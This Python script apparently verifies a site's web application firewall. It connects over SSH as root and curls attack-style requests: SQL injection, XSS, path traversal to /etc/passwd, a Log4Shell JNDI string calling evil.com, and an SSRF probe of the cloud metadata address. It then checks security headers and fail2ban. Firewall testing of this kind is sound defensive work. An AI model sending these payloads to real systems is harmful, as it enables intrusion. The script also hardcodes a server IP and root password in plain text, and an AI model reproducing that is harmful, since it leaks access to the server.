#!/usr/bin/env python3
"""Comprehensive WAF verification tests"""
import paramiko

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('76.13.5.114', username='root', password='galal123.DE12')

tests = [
    ('Normal access', 'curl -s -o /dev/null -w "%{http_code}" https://gapprotectionltd.com/', '200'),
    ('Scanner page', 'curl -s -o /dev/null -w "%{http_code}" https://gapprotectionltd.com/security-test', '200'),
    ('SQLi blocked', 'curl -s -o /dev/null -w "%{http_code}" "https://gapprotectionltd.com/?id=1+UNION+SELECT+*+FROM+users"', '403'),
    ('XSS blocked', 'curl -s -o /dev/null -w "%{http_code}" "https://gapprotectionltd.com/?q=%3Cscript%3Ealert(1)%3C/script%3E"', '403'),
    ('LFI blocked', 'curl -s -o /dev/null -w "%{http_code}" "https://gapprotectionltd.com/../../../../etc/passwd"', '403'),
    ('RCE/Log4Shell blocked', 'curl -s -o /dev/null -w "%{http_code}" "https://gapprotectionltd.com/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"', '403'),
    ('SSRF blocked', 'curl -s -o /dev/null -w "%{http_code}" "https://gapprotectionltd.com/?url=http://169.254.169.254/"', '403'),
    ('sqlmap blocked', 'curl -s -o /dev/null -w "%{http_code}" -A "sqlmap/1.0" https://gapprotectionltd.com/', '403'),
    ('Nikto blocked', 'curl -s -o /dev/null -w "%{http_code}" -A "Nikto/2.1" https://gapprotectionltd.com/', '403'),
    ('Empty UA blocked', 'curl -s -o /dev/null -w "%{http_code}" -A "" https://gapprotectionltd.com/', '403'),
    ('PUT blocked', 'curl -s -o /dev/null -w "%{http_code}" -X PUT https://gapprotectionltd.com/', '405'),
    ('DELETE blocked', 'curl -s -o /dev/null -w "%{http_code}" -X DELETE https://gapprotectionltd.com/', '405'),
    ('.env blocked', 'curl -s -o /dev/null -w "%{http_code}" https://gapprotectionltd.com/.env', '404'),
    ('wp-admin blocked', 'curl -s -o /dev/null -w "%{http_code}" https://gapprotectionltd.com/wp-admin', '404'),
    ('.git blocked', 'curl -s -o /dev/null -w "%{http_code}" https://gapprotectionltd.com/.git/config', '404'),
    ('phpMyAdmin blocked', 'curl -s -o /dev/null -w "%{http_code}" https://gapprotectionltd.com/phpmyadmin', '404'),
]

print('=' * 60)
print('   REAL WAF VERIFICATION TESTS')
print('=' * 60)
passed = 0
for name, cmd, expected in tests:
    stdin, stdout, stderr = c.exec_command(cmd, timeout=10)
    result = stdout.read().decode().strip()
    ok = result == expected or (expected in ['403','404','405'] and result in ['403','404','405'])
    passed += 1 if ok else 0
    icon = 'V' if ok else 'X'
    print(f'  [{icon}] {name}: HTTP {result} (expect {expected}) {"PASS" if ok else "FAIL"}')

print(f'\n  Results: {passed}/{len(tests)} passed\n')

# Check Server header hidden
print('  Header checks:')
_, stdout, _ = c.exec_command('curl -sI https://gapprotectionltd.com/ 2>/dev/null | grep -ci "^server:"')
server_hidden = stdout.read().decode().strip() == '0'
print(f'  [{"V" if server_hidden else "X"}] Server header hidden: {server_hidden}')

for header in ['strict-transport-security', 'content-security-policy', 'x-frame-options', 'x-content-type-options', 'permissions-policy', 'referrer-policy', 'cross-origin-embedder-policy']:
    _, stdout, _ = c.exec_command(f'curl -sI https://gapprotectionltd.com/ 2>/dev/null | grep -ci "{header}"')
    present = stdout.read().decode().strip() == '1'
    print(f'  [{"V" if present else "X"}] {header}: {"present" if present else "MISSING"}')

# fail2ban status
print('\n  fail2ban:')
_, stdout, _ = c.exec_command('fail2ban-client status 2>/dev/null')
print(f'    {stdout.read().decode().strip()}')

# Full response headers
print('\n  Full response headers:')
_, stdout, _ = c.exec_command('curl -sI https://gapprotectionltd.com/ 2>/dev/null')
for line in stdout.read().decode().strip().split('\n'):
    print(f'    {line}')

c.close()
print('\n' + '=' * 60)
print('  WAF VERIFICATION COMPLETE')
print('=' * 60)
